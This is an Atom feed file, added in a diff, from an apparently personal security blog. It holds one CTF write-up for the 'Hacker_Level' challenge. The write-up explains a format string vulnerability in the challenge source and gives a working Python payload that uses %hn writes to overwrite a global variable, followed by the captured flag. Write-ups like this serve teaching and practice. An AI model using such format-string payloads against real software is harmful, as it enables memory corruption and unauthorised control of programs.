@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Format | staring into /dev/null]]></title>
+  <link href="http://barrebas.github.io/blog/categories/format/atom.xml" rel="self"/>
+  <link href="http://barrebas.github.io/"/>
+  <updated>2015-08-18T21:42:50+02:00</updated>
+  <id>http://barrebas.github.io/</id>
+  <author>
+    <name><![CDATA[barrebas]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[CAMP CTF - Hacker_Level]]></title>
+    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-hacker-level/"/>
+    <updated>2015-08-18T21:34:00+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-hacker-level</id>
+    <content type="html"><![CDATA[<p>Easy 200 points.</p>
+
+<!--more-->
+
+
+<p>We&rsquo;re given a binary and the source. We need to supply a name that will be processed into an integer. The resulting integer should be <code>0xCCC31337</code>. If you look at the function:</p>
+
+<pre><code class="c">static uint32_t level = 0;
+
+...
+
+static void calc_level(const char *name) {
+    for (const char *p = name; *p; p++) {
+        level *= 257;
+        level ^= *p;
+    }
+    level %= 0xcafe;
+}
+</code></pre>
+
+<p>Finally, the value for <code>level</code> is modulo&rsquo;d with <code>0xcafe</code>. This means that <code>level</code> can <em>never</em> be the required value <code>0xCCC31337</code>. We&rsquo;ll need to co-opt another section of code to pass the check. This quickly came to mind:</p>
+
+<pre><code class="c">    printf("What's your name? ");
+    fgets(name, sizeof name, stdin);
+
+    calc_level(name);
+
+    usleep(150000);
+    printf("Hello, ");
+    printf(name);
+</code></pre>
+
+<p>Excellent. We have a format string vulnerability. After hex-editing the binary to get rid of the <code>usleep()</code> calls, I bruteforced the location of our format string on the stack (starts at position 7). Next, the disassembly of <code>hacker-level</code> shows us where <code>level</code> is at in memory:</p>
+
+<pre><code> 8048620:   cmp    DWORD PTR ds:0x804a04c,0xccc31337
+</code></pre>
+
+<p>All I needed to do was to write the correct format string. I came up with:</p>
+
+<pre><code class="python">import struct
+def p(x):
+    return struct.pack('&lt;L', x)
+
+payload = ""
+payload += p(0x804a04c)
+payload += p(0x804a04e)
+payload += "%4911c%7$hn%47500c%8$hn"
+
+print payload
+</code></pre>
+
+<p>Running this against the remote binary using <code>nc</code> gave <code>The flag is: CAMP15_337deec05ccc63b1168ba3379ae4d65854132604</code>. Done!</p>
+]]></content>
+  </entry>
+  
+</feed>
